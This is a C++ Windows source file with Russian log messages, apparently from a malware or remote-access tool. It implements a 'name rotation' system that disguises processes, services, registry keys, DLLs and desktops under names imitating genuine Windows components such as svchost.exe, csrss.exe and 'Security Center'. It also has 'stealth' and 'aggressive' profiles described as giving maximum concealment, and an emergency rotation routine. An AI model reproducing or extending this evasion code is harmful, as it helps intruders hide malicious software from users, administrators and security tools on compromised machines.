#include "auto_rotation.h"
#include "../logger/file_logger.h"
#include "../common.h"
#include <algorithm>
#include <chrono>
#include <sstream>
#include <fstream>
#include <filesystem>

extern "C" {
    void LogInfo(const char* message);
    void LogError(const char* message);
    void LogDebug(const char* message);
    void LogWarning(const char* message);
}

namespace AutoRotation {

static const std::vector<std::string> DEFAULT_PROCESS_NAMES = {
    "svchost.exe", "explorer.exe", "dwm.exe", "winlogon.exe", "csrss.exe",
    "chrome.exe", "firefox.exe", "notepad.exe", "calc.exe", "mspaint.exe"
};

static const std::vector<std::string> DEFAULT_SERVICE_NAMES = {
    "Windows Update", "Background Tasks", "System Monitor", "Service Host",
    "Application Framework", "Runtime Broker", "Security Center"
};

static const std::vector<std::string> DEFAULT_REGISTRY_KEYS = {
    "Run", "RunOnce", "Policies", "Explorer", "Winlogon", "Services"
};

NameRotator::NameRotator() 
    : m_autoRotationActive(false), m_rotationThread(nullptr), m_shutdownEvent(nullptr) {
    
    InitializeCriticalSection(&m_criticalSection);
    LoadDefaultNamePools();
    
    LogDebug("NameRotator - Инициализация ротатора имен");
}

NameRotator::~NameRotator() {
    StopAutoRotation();
    DeleteCriticalSection(&m_criticalSection);
    LogDebug("NameRotator - Деинициализация ротатора имен");
}

bool NameRotator::RegisterRotationType(RotationType type, const RotationConfig& config) {
    EnterCriticalSection(&m_criticalSection);
    
    m_configs[type] = config;
    m_configs[type].type = type;
    
    if (config.namePool.empty()) {
        switch (type) {
            case RotationType::PROCESS_NAMES:
                m_configs[type].namePool = DEFAULT_PROCESS_NAMES;
                break;
            case RotationType::SERVICE_NAMES:
                m_configs[type].namePool = DEFAULT_SERVICE_NAMES;
                break;
            case RotationType::REGISTRY_KEYS:
                m_configs[type].namePool = DEFAULT_REGISTRY_KEYS;
                break;
            default:
                m_configs[type].namePool = {"default_name"};
                break;
        }
    }
    
    if (m_configs[type].currentName.empty()) {
        m_configs[type].currentName = SelectFromPool(type);
    }
    
    LeaveCriticalSection(&m_criticalSection);
    
    LogInfo("NameRotator - Зарегистрирован тип ротации");
    return true;
}

bool NameRotator::EnableRotation(RotationType type, bool enable) {
    EnterCriticalSection(&m_criticalSection);
    
    auto it = m_configs.find(type);
    if (it != m_configs.end()) {
        it->second.enabled = enable;
        LeaveCriticalSection(&m_criticalSection);
        
        LogInfo(enable ? "NameRotator - Ротация включена" : "NameRotator - Ротация отключена");
        return true;
    }
    
    LeaveCriticalSection(&m_criticalSection);
    return false;
}

std::string NameRotator::GetCurrentName(RotationType type) const {
    EnterCriticalSection(&m_criticalSection);
    
    auto it = m_configs.find(type);
    std::string result = (it != m_configs.end()) ? it->second.currentName : "";
    
    LeaveCriticalSection(&m_criticalSection);
    return result;
}

bool NameRotator::PerformRotation(RotationType type) {
    EnterCriticalSection(&m_criticalSection);
    
    auto it = m_configs.find(type);
    if (it == m_configs.end() || !it->second.enabled) {
        LeaveCriticalSection(&m_criticalSection);
        return false;
    }
    
    RotationEvent event;
    event.type = type;
    event.oldName = it->second.currentName;
    event.timestamp = GetTickCount();
    
    std::string newName = GenerateRandomName(type);
    if (newName.empty()) {
        newName = SelectFromPool(type);
    }
    
    if (newName != it->second.currentName) {
        it->second.currentName = newName;
        it->second.rotationCount++;
        
        event.newName = newName;
        event.success = true;
        
        if (m_callbacks.find(type) != m_callbacks.end()) {
            m_callbacks[type](event);
        }
        
        RecordRotationEvent(event);
        
        LogInfo("NameRotator - Выполнена ротация имени");
    } else {
        event.success = false;
        event.errorMessage = "Новое имя совпадает с текущим";
    }
    
    LeaveCriticalSection(&m_criticalSection);
    return event.success;
}

void NameRotator::PerformAllRotations() {
    EnterCriticalSection(&m_criticalSection);
    
    for (auto& pair : m_configs) {
        if (pair.second.enabled) {
            LeaveCriticalSection(&m_criticalSection);
            PerformRotation(pair.first);
            EnterCriticalSection(&m_criticalSection);
        }
    }
    
    LeaveCriticalSection(&m_criticalSection);
    LogInfo("NameRotator - Выполнена массовая ротация имен");
}

bool NameRotator::StartAutoRotation() {
    if (m_autoRotationActive) {
        return true;
    }
    
    m_shutdownEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (!m_shutdownEvent) {
        return false;
    }
    
    m_rotationThread = CreateThread(NULL, 0, RotationThreadProc, this, 0, NULL);
    if (!m_rotationThread) {
        CloseHandle(m_shutdownEvent);
        m_shutdownEvent = nullptr;
        return false;
    }
    
    m_autoRotationActive = true;
    LogInfo("NameRotator - Запущена автоматическая ротация");
    return true;
}

void NameRotator::StopAutoRotation() {
    if (!m_autoRotationActive) {
        return;
    }
    
    m_autoRotationActive = false;
    
    if (m_shutdownEvent) {
        SetEvent(m_shutdownEvent);
    }
    
    if (m_rotationThread) {
        WaitForSingleObject(m_rotationThread, 5000);
        CloseHandle(m_rotationThread);
        m_rotationThread = nullptr;
    }
    
    if (m_shutdownEvent) {
        CloseHandle(m_shutdownEvent);
        m_shutdownEvent = nullptr;
    }
    
    LogInfo("NameRotator - Остановлена автоматическая ротация");
}

std::string NameRotator::GenerateRandomName(RotationType type) {
    std::random_device rd;
    std::mt19937 gen(rd());
    
    switch (type) {
        case RotationType::PROCESS_NAMES: {
            std::uniform_int_distribution<int> choice(0, 2);
            switch (choice(gen)) {
                case 0: return Utils::GenerateProcessLikeName();
                case 1: return Utils::GenerateRandomIdentifier(8) + ".exe";
                default: return "svchost.exe";
            }
        }
        
        case RotationType::SERVICE_NAMES:
            return Utils::GenerateServiceLikeName();
            
        case RotationType::DLL_NAMES:
            return Utils::GenerateRandomIdentifier(10) + ".dll";
            
        case RotationType::REGISTRY_KEYS:
            return Utils::GenerateRandomIdentifier(12);
            
        case RotationType::TEMP_FILES:
            return Utils::GenerateRandomIdentifier(8) + ".tmp";
            
        default:
            return Utils::GenerateRandomIdentifier(10);
    }
}

std::string NameRotator::SelectFromPool(RotationType type) {
    auto it = m_namePools.find(type);
    if (it == m_namePools.end() || it->second.empty()) {
        return GenerateRandomName(type);
    }
    
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<size_t> dis(0, it->second.size() - 1);
    
    return it->second[dis(gen)];
}

void NameRotator::LoadDefaultNamePools() {
    m_namePools[RotationType::PROCESS_NAMES] = DEFAULT_PROCESS_NAMES;
    m_namePools[RotationType::SERVICE_NAMES] = DEFAULT_SERVICE_NAMES;
    m_namePools[RotationType::REGISTRY_KEYS] = DEFAULT_REGISTRY_KEYS;
    
    m_namePools[RotationType::DLL_NAMES] = {
        "kernel32.dll", "ntdll.dll", "user32.dll", "advapi32.dll"
    };
    
    m_namePools[RotationType::DESKTOP_NAMES] = {
        "Default", "Winlogon", "Screen-saver", "Service-0x0-3e7$"
    };
}

void NameRotator::RecordRotationEvent(const RotationEvent& event) {
    m_history[event.type].push_back(event);
    
    if (m_history[event.type].size() > 100) {
        m_history[event.type].erase(m_history[event.type].begin());
    }
}

DWORD WINAPI NameRotator::RotationThreadProc(LPVOID lpParam) {
    NameRotator* rotator = static_cast<NameRotator*>(lpParam);
    rotator->RotationWorker();
    return 0;
}

void NameRotator::RotationWorker() {
    while (m_autoRotationActive) {
        DWORD minInterval = INFINITE;
        
        EnterCriticalSection(&m_criticalSection);
        for (const auto& pair : m_configs) {
            if (pair.second.enabled && pair.second.intervalMs < minInterval) {
                minInterval = pair.second.intervalMs;
            }
        }
        LeaveCriticalSection(&m_criticalSection);
        
        if (minInterval == INFINITE) {
            minInterval = 60000; // Default 1 minute
        }
        
        if (WaitForSingleObject(m_shutdownEvent, minInterval) != WAIT_TIMEOUT) {
            break;
        }
        
        PerformAllRotations();
    }
}

TempFileManager::TempFileManager() 
    : m_maxTempFiles(1000), m_autoCleanupEnabled(true), m_cleanupInterval(600000),
      m_cleanupThread(nullptr), m_shutdownEvent(nullptr) {
    
    InitializeCriticalSection(&m_criticalSection);
    
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    m_baseDirectory = std::string(tempPath);
    
    LogDebug("TempFileManager - Инициализация менеджера временных файлов");
}

TempFileManager::~TempFileManager() {
    if (m_autoCleanupEnabled) {
        CleanupAllTempFiles();
    }
    
    if (m_cleanupThread) {
        SetEvent(m_shutdownEvent);
        WaitForSingleObject(m_cleanupThread, 5000);
        CloseHandle(m_cleanupThread);
    }
    
    if (m_shutdownEvent) {
        CloseHandle(m_shutdownEvent);
    }
    
    DeleteCriticalSection(&m_criticalSection);
    LogDebug("TempFileManager - Деинициализация менеджера временных файлов");
}

std::string TempFileManager::CreateTempFile(const std::string& prefix, const std::string& extension) {
    std::string filePath = GenerateUniquePath(prefix, extension, false);
    
    HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_WRITE, 0, NULL, 
                               CREATE_NEW, FILE_ATTRIBUTE_TEMPORARY, NULL);
    
    if (hFile != INVALID_HANDLE_VALUE) {
        CloseHandle(hFile);
        RegisterTempFile(filePath, 3600000); // 1 hour default lifetime
        return filePath;
    }
    
    return "";
}

std::string TempFileManager::CreateTempDirectory(const std::string& prefix) {
    std::string dirPath = GenerateUniquePath(prefix, "", true);
    
    if (CreateDirectoryA(dirPath.c_str(), NULL)) {
        RegisterTempDirectory(dirPath, 3600000); // 1 hour default lifetime
        return dirPath;
    }
    
    return "";
}

bool TempFileManager::RegisterTempFile(const std::string& filePath, DWORD lifetimeMs) {
    EnterCriticalSection(&m_criticalSection);
    
    if (m_tempFiles.size() >= m_maxTempFiles) {
        CleanupExpiredFiles();
        
        if (m_tempFiles.size() >= m_maxTempFiles) {
            LeaveCriticalSection(&m_criticalSection);
            LogWarning("TempFileManager - Достигнут лимит временных файлов");
            return false;
        }
    }
    
    TempFileInfo info(filePath, lifetimeMs, false);
    m_tempFiles.push_back(info);
    
    LeaveCriticalSection(&m_criticalSection);
    
    LogDebug("TempFileManager - Зарегистрирован временный файл");
    return true;
}

void TempFileManager::CleanupExpiredFiles() {
    EnterCriticalSection(&m_criticalSection);
    
    auto it = m_tempFiles.begin();
    int cleaned = 0;
    
    while (it != m_tempFiles.end()) {
        if (IsPathExpired(*it)) {
            if (DeletePath(it->path, it->isDirectory)) {
                cleaned++;
            }
            it = m_tempFiles.erase(it);
        } else {
            ++it;
        }
    }
    
    LeaveCriticalSection(&m_criticalSection);
    
    if (cleaned > 0) {
        LogInfo("TempFileManager - Очищены просроченные файлы");
    }
}

void TempFileManager::CleanupAllTempFiles() {
    EnterCriticalSection(&m_criticalSection);
    
    int cleaned = 0;
    for (const auto& info : m_tempFiles) {
        if (DeletePath(info.path, info.isDirectory)) {
            cleaned++;
        }
    }
    
    m_tempFiles.clear();
    LeaveCriticalSection(&m_criticalSection);
    
    LogInfo("TempFileManager - Очищены все временные файлы");
}

std::string TempFileManager::GenerateUniquePath(const std::string& prefix, 
                                               const std::string& extension, 
                                               bool isDirectory) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dis(1000, 9999);
    
    std::string fileName = prefix.empty() ? "temp" : prefix;
    fileName += "_" + std::to_string(GetTickCount()) + "_" + std::to_string(dis(gen));
    
    if (!isDirectory && !extension.empty()) {
        fileName += extension;
    }
    
    return m_baseDirectory + "\\" + fileName;
}

bool TempFileManager::DeletePath(const std::string& path, bool isDirectory) {
    if (isDirectory) {
        return RemoveDirectoryA(path.c_str()) != 0;
    } else {
        return DeleteFileA(path.c_str()) != 0;
    }
}

bool TempFileManager::IsPathExpired(const TempFileInfo& info) const {
    if (info.lifetimeMs == 0) {
        return false; // Permanent file
    }
    
    DWORD currentTime = GetTickCount();
    return (currentTime - info.creationTime) > info.lifetimeMs;
}

RotationManager& RotationManager::GetInstance() {
    static RotationManager instance;
    return instance;
}

RotationManager::RotationManager() 
    : m_masterRotationEnabled(true), m_rotationsPaused(false), m_initialized(false) {
    
    InitializeCriticalSection(&m_statsCriticalSection);
}

RotationManager::~RotationManager() {
    Shutdown();
    DeleteCriticalSection(&m_statsCriticalSection);
}

void RotationManager::Initialize() {
    if (m_initialized) {
        return;
    }
    
    m_nameRotator = std::make_unique<NameRotator>();
    m_tempFileManager = std::make_unique<TempFileManager>();
    m_rotationScheduler = std::make_unique<RotationScheduler>();
    m_profileManager = std::make_unique<RotationProfileManager>();
    
    LoadDefaultConfiguration();
    
    m_initialized = true;
    LogInfo("RotationManager - Система ротации инициализирована");
}

void RotationManager::Shutdown() {
    if (!m_initialized) {
        return;
    }
    
    m_nameRotator.reset();
    m_tempFileManager.reset();
    m_rotationScheduler.reset();
    m_profileManager.reset();
    
    m_initialized = false;
    LogInfo("RotationManager - Система ротации деинициализирована");
}

void RotationManager::LoadDefaultConfiguration() {
    RotationConfig processConfig;
    processConfig.type = RotationType::PROCESS_NAMES;
    processConfig.intervalMs = 300000; // 5 minutes
    processConfig.enabled = true;
    processConfig.namePool = DEFAULT_PROCESS_NAMES;
    
    m_nameRotator->RegisterRotationType(RotationType::PROCESS_NAMES, processConfig);
    
    RotationConfig desktopConfig;
    desktopConfig.type = RotationType::DESKTOP_NAMES;
    desktopConfig.intervalMs = 600000; // 10 minutes
    desktopConfig.enabled = true;
    
    m_nameRotator->RegisterRotationType(RotationType::DESKTOP_NAMES, desktopConfig);
}

void RotationManager::EmergencyRotation() {
    if (!m_initialized || m_rotationsPaused) {
        return;
    }
    
    LogWarning("RotationManager - Выполняется экстренная ротация");
    
    m_nameRotator->PerformAllRotations();
    m_tempFileManager->CleanupExpiredFiles();
    
    UpdateRotationStats(RotationType::PROCESS_NAMES, true, 100);
}

namespace Utils {

std::string GenerateRandomIdentifier(DWORD length) {
    const std::string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::string result;
    result.reserve(length);
    
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<size_t> dis(0, chars.size() - 1);
    
    for (DWORD i = 0; i < length; i++) {
        result += chars[dis(gen)];
    }
    
    return result;
}

std::string GenerateProcessLikeName() {
    std::vector<std::string> prefixes = {"svc", "win", "sys", "ms", "app"};
    std::vector<std::string> suffixes = {"host", "mgr", "srv", "exe", "proc"};
    
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<size_t> prefixDis(0, prefixes.size() - 1);
    std::uniform_int_distribution<size_t> suffixDis(0, suffixes.size() - 1);
    
    return prefixes[prefixDis(gen)] + suffixes[suffixDis(gen)] + ".exe";
}

std::string GenerateServiceLikeName() {
    std::vector<std::string> adjectives = {"System", "Windows", "Application", "Background", "Runtime"};
    std::vector<std::string> nouns = {"Service", "Manager", "Host", "Framework", "Monitor"};
    
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<size_t> adjDis(0, adjectives.size() - 1);
    std::uniform_int_distribution<size_t> nounDis(0, nouns.size() - 1);
    
    return adjectives[adjDis(gen)] + " " + nouns[nounDis(gen)];
}

bool IsValidRotationType(RotationType type) {
    return type >= RotationType::PROCESS_NAMES && type <= RotationType::DIRECTORY_NAMES;
}

std::string RotationTypeToString(RotationType type) {
    switch (type) {
        case RotationType::PROCESS_NAMES: return "ProcessNames";
        case RotationType::DESKTOP_NAMES: return "DesktopNames";
        case RotationType::DLL_NAMES: return "DllNames";
        case RotationType::TEMP_FILES: return "TempFiles";
        case RotationType::REGISTRY_KEYS: return "RegistryKeys";
        case RotationType::SERVICE_NAMES: return "ServiceNames";
        case RotationType::MUTEX_NAMES: return "MutexNames";
        case RotationType::EVENT_NAMES: return "EventNames";
        case RotationType::PIPE_NAMES: return "PipeNames";
        case RotationType::DIRECTORY_NAMES: return "DirectoryNames";
        default: return "Unknown";
    }
}

}

RotationScheduler::RotationScheduler() 
    : m_jitterMs(30000), m_schedulerActive(false), m_schedulerThread(nullptr), m_shutdownEvent(nullptr) {
    
    InitializeCriticalSection(&m_criticalSection);
    LogDebug("RotationScheduler - Инициализация планировщика ротации");
}

RotationScheduler::~RotationScheduler() {
    StopScheduler();
    DeleteCriticalSection(&m_criticalSection);
    LogDebug("RotationScheduler - Деинициализация планировщика ротации");
}

RotationProfileManager::RotationProfileManager() 
    : m_currentProfile("default"), m_defaultProfile("default") {
    
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    m_profilesDirectory = std::string(tempPath) + "\\rotation_profiles";
    CreateDirectoryA(m_profilesDirectory.c_str(), NULL);
    
    LoadBuiltinProfiles();
    LogDebug("RotationProfileManager - Инициализация менеджера профилей ротации");
}

RotationProfileManager::~RotationProfileManager() {
    LogDebug("RotationProfileManager - Деинициализация менеджера профилей ротации");
}

void RotationProfileManager::LoadBuiltinProfiles() {
    CreateStealthProfile();
    CreateAggressiveProfile();
    CreateConservativeProfile();
}

void RotationProfileManager::CreateStealthProfile() {
    RotationProfile profile;
    profile.name = "stealth";
    profile.description = "Стелс-режим с минимальной активностью";
    profile.globalInterval = 600000; // 10 minutes
    profile.autoRotationEnabled = true;
    profile.maxRotationsPerHour = 10;
    
    m_profiles["stealth"] = profile;
}

void RotationProfileManager::CreateAggressiveProfile() {
    RotationProfile profile;
    profile.name = "aggressive";
    profile.description = "Агрессивная ротация для максимальной скрытности";
    profile.globalInterval = 120000; // 2 minutes
    profile.autoRotationEnabled = true;
    profile.maxRotationsPerHour = 30;
    
    m_profiles["aggressive"] = profile;
}

void RotationProfileManager::CreateConservativeProfile() {
    RotationProfile profile;
    profile.name = "conservative";
    profile.description = "Консервативная ротация для стабильности";
    profile.globalInterval = 1800000; // 30 minutes
    profile.autoRotationEnabled = false;
    profile.maxRotationsPerHour = 2;
    
    m_profiles["conservative"] = profile;
}

}